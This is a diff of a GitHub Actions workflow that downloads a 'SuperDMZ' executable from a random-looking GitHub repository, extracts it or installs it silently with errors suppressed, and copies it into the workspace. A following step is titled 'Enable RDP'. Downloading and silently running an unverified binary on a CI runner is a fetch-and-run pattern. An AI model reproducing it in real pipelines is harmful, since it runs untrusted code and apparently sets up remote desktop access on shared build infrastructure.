@@ -11,41 +11,42 @@ jobs:
 
     steps:
 
-      - name: Download and Install SuperDMZ Client
+      - name: Download and Extract SuperDMZ Client
         shell: pwsh
         run: |
           $ErrorActionPreference = "Stop"
 
           $rawUrl = "https://raw.githubusercontent.com/drisrida123455-wq/Xddg77-GbklKMooooooooo156sqd89fh47gfhj-g/main/SuperDMZ-Setup-v1.9.1.exe"
-          $installer = "$env:RUNNER_TEMP\SuperDMZ-Setup.exe"
+          $installer = "$env:RUNNER_TEMP\installer.exe"
+          $extractDir = "$env:RUNNER_TEMP\extracted"
           $targetExec = "$env:GITHUB_WORKSPACE\superdmz.exe"
 
-          Write-Host "جاري تحميل مثبت SuperDMZ..."
+          Write-Host "جاري تحميل ملف التثبيت..."
           curl.exe -sL $rawUrl -o $installer
 
           if (-not (Test-Path $installer)) {
-            throw "فشل تحميل ملف التثبيت!"
+            throw "فشل تحميل ملف التثبيت من المستودع."
           }
 
-          Write-Host "تم التحميل بنجاح. جاري التثبيت الصامت..."
-          Start-Process -FilePath $installer -ArgumentList "/S", "/VERYSILENT", "/quiet" -Wait -ErrorAction SilentlyContinue
+          Write-Host "جاري استخراج الملف التنفيذي باستخدام 7-Zip..."
+          7z x $installer "-o$extractDir" -y | Out-Null
 
-          # البحث عن مكان تثبيت البرنامج
-          $possiblePaths = @(
-            "$env:ProgramFiles\SuperDMZ\superdmz.exe",
-            "${env:ProgramFiles(x86)}\SuperDMZ\superdmz.exe",
-            "$env:LOCALAPPDATA\Programs\SuperDMZ\superdmz.exe",
-            "$env:APPDATA\SuperDMZ\superdmz.exe"
-          )
+          # البحث عن الملف التنفيذي داخل الأرشيف المستخرج
+          $foundExe = Get-ChildItem -Path $extractDir -Recurse -Filter "*.exe" | 
+            Where-Object { $_.Name -notmatch "setup|uninstall" } | 
+            Select-Object -First 1
 
-          $foundPath = $possiblePaths | Where-Object { Test-Path $_ } | Select-Object -First 1
+          if (-not $foundExe) {
+            Write-Host "جاري تجربة التثبيت الصامت كخيار بديل..."
+            Start-Process -FilePath $installer -ArgumentList "/S", "/VERYSILENT", "/quiet" -Wait -ErrorAction SilentlyContinue
+            $foundExe = Get-ChildItem -Path "$env:ProgramFiles", "$env:LOCALAPPDATA" -Recurse -Filter "superdmz.exe" -ErrorAction SilentlyContinue | Select-Object -First 1
+          }
 
-          if ($foundPath) {
-            Copy-Item -Path $foundPath -Destination $targetExec -Force
-            Write-Host "تم تثبيت واستخراج superdmz.exe بنجاح."
+          if ($foundExe) {
+            Copy-Item -Path $foundExe.FullName -Destination $targetExec -Force
+            Write-Host "تم استخراج وتجهيز superdmz.exe بنجاح."
           } else {
-            Move-Item -Path $installer -Destination $targetExec -Force
-            Write-Host "تم استخدام الملف التنفيذي المباشر."
+            throw "تعذر استخراج superdmz.exe من ملف التثبيت."
           }
 
       - name: Enable RDP
